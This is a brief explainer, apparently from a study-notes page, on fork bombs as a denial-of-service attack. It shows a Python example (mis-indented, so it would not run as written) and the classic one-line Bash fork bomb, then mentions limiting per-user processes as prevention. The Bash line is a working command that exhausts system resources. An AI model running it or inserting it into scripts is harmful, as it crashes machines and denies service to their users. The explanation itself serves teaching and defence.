- #### Fork bombs
Forking is the process of replicating a process to form child processes. A fork bomb is a DOS attack where a process is recursively forked (replicated) to continously create many new child processes which eventually use up all the system's resources, leading to a system crash.
##### Examples
❌Disclaimer: These scripts might crash your machine! Run at your own risk!!❌
```python
#!/usr/bin/env python
import os
    while True: os.fork()
```
Bash
```bash
:(){ :|:& };:
````
Fork bombs can be prevented by limiting the amount of processes a single user can create.
